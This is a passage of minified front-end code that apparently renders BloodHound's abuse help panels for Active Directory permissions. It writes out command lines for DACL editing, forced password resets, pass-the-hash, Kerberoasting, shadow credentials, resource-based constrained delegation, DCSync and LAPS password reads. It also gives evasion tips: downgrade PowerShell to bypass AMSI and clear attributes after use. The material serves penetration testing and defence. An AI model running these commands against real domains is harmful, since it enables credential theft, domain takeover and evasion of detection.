'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."})]}),Ib=()=>e.jsx(t,{variant:"body2",children:"To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. Modification of the *msDS-AllowedToActOnBehalfOfOtherIdentity* property against the target also must occur, whether through PowerShell or another method. The property should be cleared (or reset to its original value) after attack execution in order to prevent easy detection."}),$b=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/",children:"https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl",children:"https://www.thehacker.recipes/ad/movement/dacl"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota",children:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"})]}),Gb=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:`"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"`}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"'$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\\n' + '$SDBytes = New-Object byte[] ($SD.BinaryLength)\\n' + '$SD.GetBinaryForm($SDBytes, 0)'`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:`"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"`}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"'Rubeus.exe hash /password:Summer2018!'"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'"})]}),Nb={general:Rb,windowsAbuse:Gb,linuxAbuse:Eb,opsec:Ib,references:$b},Mb=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," permissions to modify the DACL (Discretionary Access Control List) on the ",N(i)," ",o]}),e.jsx(t,{variant:"body2",children:"With write access to the target object's DACL, you can grant yourself any permission you want on the object."})]}),Lb=({sourceName:r,targetName:a,targetType:o,haslaps:i})=>{switch(o){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Modifying the rights "}),e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a group object, you may grant yourself the AddMember permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Adding to the group "}),e.jsx(t,{variant:"body2",children:"You can now add members to the group."}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),e.jsx(t,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsx(t,{variant:"body1",children:" Cleanup "}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a user object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsxs(t,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),e.jsx(t,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),e.jsx(t,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),e.jsx(t,{variant:"body1",children:" Force Change Password "}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),e.jsx(t,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return i?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a computer object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsxs(t,{variant:"body2",children:["The GenericAll permission allows ",r," to retrieve the LAPS (RID 500 administrator) password for ",a,"."]}),e.jsxs(t,{variant:"body2",children:["For systems using legacy LAPS, the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwd"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwdExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{})]}),e.jsxs(t,{variant:"body2",children:["For systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-Password"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-PasswordExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPassword"}),": The encrypted LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPasswordHistory"}),": The encrypted LAPS password history",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPassword"}),": The encrypted Directory Services Restore Mode (DSRM) password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPasswordHistory"}),": The encrypted DSRM password history",e.jsx("br",{})]}),e.jsx(t,{variant:"body2",children:"Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:"}),e.jsx(t,{component:"pre",children:"bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"}),e.jsx(t,{variant:"body2",children:"See Windows abuse for retrieving and decrypting the encrypted attributes."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a computer object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation "}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsxs(t,{variant:"body2",children:["To abuse this permission, use"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),e.jsx(t,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a domain object, you may grant yourself the DcSync permissions."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'DCSync' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'DCSync' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" DCSync "}),e.jsxs(t,{variant:"body2",children:["The AllExtendedRights permission grants ",r," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permissions, which combined allow a principal to replicate objects from the domain ",a,"."]}),e.jsx(t,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to obtain control of the objects of the domain is to apply a GenericAll ACE on the domain that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'DomainDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"The compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any user or computer with inheritance disabled, including objects located in nested OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on a domain object through an alternative attack vector. Indeed, with GenericAll permissions over a domain object, you may make modifications to the gPLink attribute of the domain. The ability to alter the gPLink attribute of a domain may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the domain user and computer objects (including the ones located in nested OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a Linux machine, the gPLink manipulation attack vector may be exploited using the"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/synacktiv/OUned",children:"OUned.py"})," ","tool. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"the article associated to the OUned.py tool"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of a domain can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target domain through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a GPO, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsxs(t,{variant:"body2",children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organization Unit"}),e.jsx(t,{variant:"body2",children:"With WriteDacl to an OU object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"It is important to note that the compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any OU child user or computer with ACL inheritance disabled, including objects located in nested sub-OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on an OU through an alternative attack vector. Indeed, with GenericAll permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a Linux machine, the gPLink manipulation attack vector may be exploited using the"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/synacktiv/OUned",children:"OUned.py"})," ","tool. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"the article associated to the OUned.py tool"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"Container":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Container"}),e.jsx(t,{variant:"body2",children:"With WriteDacl to a container object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});case"CertTemplate":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteDacl permission over a certificate template, you can grant yourself GenericAll. With GenericAll, you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4 edge from the principal to the forest domain node."})});case"EnterpriseCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteDacl permission over an enterprise CA, you can grant yourself GenericAll. With GenericAll, you can publish certificate templates to the enterprise CA by adding the CN name of the template in the enterprise CA object's certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation."})});case"RootCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteDacl permission over a root CA, you can grant yourself GenericAll. With GenericAll, you can make a rogue certificate trusted as a root CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"NTAuthStore":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteDacl permission over a NTAuth store, you can grant yourself GenericAll. With GenericAll, you can make an enterprise CA certificate trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation. This action may enable you to perform an ADCS domain escalation."})});case"IssuancePolicy":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteDacl permission over an issuance policy object, you can grant yourself GenericAll. With GenericAll, you create a OID group link to a targeted group by adding the groups distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This action may enable you to gain membership of the group through an ADCS ESC13 attack."})});default:return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse information available for this node type."})})}},Fb=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."}),e.jsx(t,{variant:"body2",children:"Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request."}),e.jsx(t,{variant:"body2",children:"Additional opsec considerations depend on the target object and how to take advantage of this permission. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."})]}),_b=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/n00py/DCSync",children:"https://github.com/n00py/DCSync"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener 